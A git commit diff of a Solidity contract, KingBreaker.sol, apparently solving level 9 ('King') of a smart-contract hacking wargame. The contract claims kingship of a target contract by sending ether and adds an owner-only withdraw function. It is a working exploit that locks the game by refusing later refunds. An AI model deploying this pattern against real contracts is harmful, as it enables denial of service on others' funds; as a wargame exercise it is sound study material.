79c1a9f2b36848fca65a67f39bb5fb4a725240eb
josevazf <jose.guilherme.rvf@gmail.com>
2023-08-24 18:20:04 +0100

    kingbreaker

--- Lvl9-King/contracts/KingBreaker.sol
+++ Lvl9-King/contracts/KingBreaker.sol
@@ -3,9 +3,20 @@ pragma solidity ^0.8.0;
 
 contract KingBreaker {
 	address king = 0xb26474A417d73A3C9BB3CEACfe5b898AB234Ad43;
+	address public owner;
+
+	constructor () payable{
+		owner = msg.sender;
+	}
 
 	function becomeKing() public {
-		(bool ok,) = king.call{value: 1000000000000001}("");
+		(bool ok,) = king.call{value: 1500000000000000 wei}("");
+		require(ok, "Failed");
+	}
+
+	function withdraw () public {
+		require(msg.sender == owner);
+		(bool ok,) = msg.sender.call{value: address(this).balance}("");
 		require(ok, "Failed");
 	}
 
